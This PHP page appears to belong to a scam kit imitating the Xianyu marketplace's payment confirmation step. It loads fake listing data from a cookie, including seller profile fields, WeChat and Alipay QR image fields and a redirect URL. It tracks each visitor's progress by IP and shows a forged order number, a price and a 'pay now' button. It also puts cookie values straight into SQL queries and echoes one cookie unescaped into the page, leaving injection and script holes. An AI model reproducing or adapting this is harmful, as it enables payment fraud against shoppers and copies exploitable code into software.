<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../canshu/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../canshu/getdata.php');

$xzshijian=date('Y-m-d H:i:s', time());
$wwid=$_REQUEST['a'];
$ip=getIP();

if($_COOKIE['GoodsID4']){
	$_GoodsID = _fetch_array("SELECT
									goods_class.gclass_id,
									goods_class.gc_name,
									goods_class.gc_type,
									goods_class.web_name,
									goods_class.jump_url,
									goods_class.web_logo,
									goods_class.web_name2,
									goods.goods_id,
									goods.title,
									goods.price,
									goods.freight,
									goods.region,
									goods.goods_desc,
									goods.test_desc,
									goods.hits,
									goods.stock,
									goods.doods_num,
									goods.tran_num,
									goods.recovery_rate,
									goods.user_portrait,
									goods.user_name,
									goods.user_gender,
									goods.user_grade,
									goods.att_capacity,
									goods.att_color,
									goods.att_channel,
									goods.weixin_img,
									goods.zhifubao_img,
									goods.goods_img1,
									goods.goods_img2,
									goods.goods_img3,
									goods.goods_img4,
									goods.goods_img5,
									goods.test_desc2,
									goods.is_shelves,
									goods.oldnew,
									goods.in_admin_id,
									goods.in_class_id,
									goods.imUrl,
									goods.add_time,
									goods.zhifubaoURL,
									goods.goods_oid
								FROM
									goods_class
								INNER JOIN goods ON goods_class.gclass_id = goods.in_class_id 
								WHERE goods_id='{$_COOKIE['GoodsID4']}'") or die('SQL执行错误');


}
if($_COOKIE['GoodsID4']){
	
    //存在就更新此数据状态为3地址页和时间
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE uip='{$ip}' AND gid='{$_COOKIE['GoodsID4']}'");
	
	if($_OID){
		_query("
			UPDATE 
				useraddress
			SET 
				state=4,
				utime='{$xzshijian}'
			WHERE 
				uip='{$ip}'AND gid='{$_COOKIE['GoodsID4']}' LIMIT 1") or die(mysql_error());
		  _close();
		  session_destroy();
	}
	
	
	
	if(!$_GoodsID){
       header('Location:'. htmlspecialchars_decode($_GoodsID['jump_url']).'');
    }
}else{
    header('Location:'. htmlspecialchars_decode($_GoodsID['jump_url']).'');
}

?>
<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	    <meta http-equiv="X-UA-Compatible" content="ie=edge">
	    <link rel="stylesheet" href="style/css/style.css" />
	    <script src="style/js/jquery-2.1.0.js" ></script>
	    <script src="style/js/index.js" ></script>
	    <title>确认交易</title>
	</head>
	<body class="bgColor">
		<div class="orderNumber">
			<p>闲鱼订单号：</p>
			<p><?php echo $_COOKIE['orderid']; ?></p>
			<div>&yen;&nbsp;<?php echo $_GoodsID['price'];?></div>
		</div>
		<div class="gather clearfix">
			<span class="fl">收款方</span>
			<span class="fr">闲鱼</span>
		</div>
		<a href="go.php"><input type="button" class="rightNow" value="立即支付"/></a>

	</body>
</html>